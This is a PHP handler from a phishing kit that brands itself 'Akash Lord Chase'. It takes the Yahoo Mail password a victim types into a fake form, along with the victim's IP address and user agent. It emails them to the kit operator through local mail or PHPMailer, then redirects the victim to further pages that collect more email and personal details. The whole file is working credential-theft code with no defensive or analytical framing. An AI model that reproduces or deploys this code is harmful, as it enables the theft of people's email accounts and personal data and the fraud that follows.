<?php 
session_start();
require 'edit.php';
require 'akashlord.php';

function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
function endsWith($string, $endString)
{
    $len = strlen($endString);
    if ($len == 0) {
        return true;
    }
    return (substr($string, -$len) === $endString);
}
if ($_SERVER["REQUEST_METHOD"] == "POST") {

	$ypassd = test_input($_POST["ypassd"]);
	

	$msg = "<h3>Akash Lord Chase Result</h3><br><strong>Ip Adress: ".getUserIpAddr()."<br>Yahoo Mail Password: ". $ypassd." <br> User Agent: ".$_SERVER['HTTP_USER_AGENT']." </strong>";
	try {
            $S="#CHASE Yahoo Password ACCESS =>  From [{$_SESSION['ip']}] [{$_SESSION["user"]}]";

    } catch (Exception $e) {
        $S = "Ip Adress: ".getUserIpAddr();
        
    }
	if ($local_mail) {
		LocalMail($msg, $S);
	}
	if ($phpmailer_mail) {
		PhpmailerMail($msg,$S);
	}
	if ($_SESSION['email'] == 1) {
        
            $_SESSION['email'] = 2;
            echo '<script type="text/javascript">window.location.replace("../email.php");</script>';
        }else{
	       echo '<script type="text/javascript">window.location.replace("../persnal-info.php");</script>';
       }
		

	
}

function test_input($data) {
  $data = trim($data);
  $data = stripslashes($data);
  $data = htmlspecialchars($data);
  return $data;
}
 ?>
	
